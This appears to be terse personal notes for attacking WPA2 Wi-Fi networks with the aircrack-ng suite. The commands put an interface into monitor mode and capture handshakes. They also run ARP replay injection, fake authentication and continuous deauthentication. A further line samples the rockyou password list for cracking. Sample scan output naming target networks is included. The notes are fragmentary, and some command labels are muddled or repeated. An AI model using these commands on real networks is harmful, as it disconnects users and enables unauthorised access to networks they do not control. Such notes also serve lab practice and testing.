


`airmon-ng start wlan0`

get BSSID
`airodump-ng wlan0mon`

start capturing packets
`airodump-ng wlan0mon --bssid <bssid> --channel <#> --write crackThis`    // -j flag for hashcat output

Inject:

get mac MAC
`aireplay-ng --arpreplay wlan0mon -e <ESSID> -h <BSSID>`


fake authentication
`aireplay-ng --fakeauth 0 -a <BSSID> wlan0mon -h <mac>`


deauthorize
`aireplay-ng --deauth 0 -e <ESSID> wlan0mon`


look at aireplay results
`aireplay-ng --arpreplay wlan0mon -e <ESSID> -h <BSSID>`

head /usr/share/wordlists/rockyou.txt -n 10000 | shuf -n 5 -

`<mac address>  -56       13        0    0   4  360   WPA2 CCMP   PSK  illuminati `


`airodump-ng wlan0mon --bssid <mac address> --channel 4 --write crackThis`


`aireplay-ng --arpreplay wlan0mon -e illuminati -h <mac address>`

`<mac address>`

`aireplay-ng --fakeauth 0 -a <mac address> wlan0mon -h <mac address>`

`aireplay-ng --deauth 0 -e illuminati wlan0mon`

``` bash
airodump-ng wlan0mon --bssid <mac address> --channel 1 --write crackThisOne

aireplay-ng --arpreplay wlan0mon -e Max -h <mac address>

aireplay-ng --fakeauth 0 -a <mac address> wlan0mon -h <mac address>

<mac address>  -31        2        0    0   1  130   WPA2 CCMP   PSK  <network name>
```
